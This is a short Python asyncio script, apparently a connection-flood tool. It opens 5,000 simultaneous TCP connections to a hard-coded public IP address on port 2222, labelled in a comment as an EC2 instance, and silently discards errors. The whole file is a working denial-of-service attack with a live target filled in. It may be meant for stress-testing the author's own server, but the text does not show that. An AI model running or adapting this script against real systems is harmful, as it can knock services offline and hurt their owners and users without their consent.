import asyncio

async def flood(target_ip, target_port):
    try:
        reader, writer = await asyncio.open_connection(target_ip, target_port)
        writer.close()
        print(f"Connected to {target_ip}:{target_port}")
    except Exception as e:
        pass

async def main():
    target_ip = "16.171.0.195"  # EC2 instance's public IP
    target_port = 2222
    tasks = [flood(target_ip, target_port) for _ in range(5000)]  # 5k connections
    await asyncio.gather(*tasks)

asyncio.run(main())